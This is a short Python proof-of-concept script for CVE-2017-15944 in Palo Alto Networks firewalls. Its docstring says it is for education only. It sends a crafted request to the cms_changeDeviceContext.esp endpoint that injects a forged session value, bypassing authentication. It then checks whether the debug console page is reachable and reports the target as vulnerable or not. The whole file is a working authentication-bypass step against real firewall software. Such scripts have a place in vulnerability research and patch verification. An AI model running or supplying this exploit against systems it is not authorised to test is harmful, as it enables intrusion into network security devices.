#!/usr/bin/env python
#--*-- coding:utf-8 --*--

import requests

class PoC(object):
    '''
    Palo Alto Networks firewalls
    RCE, CVE-2017-15944 Proof of Concept
    Education purpose only! Do not use illegal way.
    '''

    def __init__(self, url):
        self.baseurl = url

    def run(self):
        create_session_url = '{}/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";'.format(self.baseurl)
        verify_url = '{}/php/utils/debug.php'.format(self.baseurl)

        session = requests.Session()

        if 'https' in self.baseurl:
            session.get(verify_url, verify=False)
            session.get(create_session_url, verify=False)
            verify = session.get(verify_url, verify=False)
        else:
            session.get(verify_url)
            session.get(create_session_url)
            verify = session.get(verify_url)

        if 'Debug Console' in verify.text:
            print('{} is vulnerable'.format(self.baseurl))
        else:
            print('{} is not vulnerable'.format(self.baseurl))

if __name__ == '__main__':
    obj1 = PoC("https://192.168.1.1")
    obj1.run()
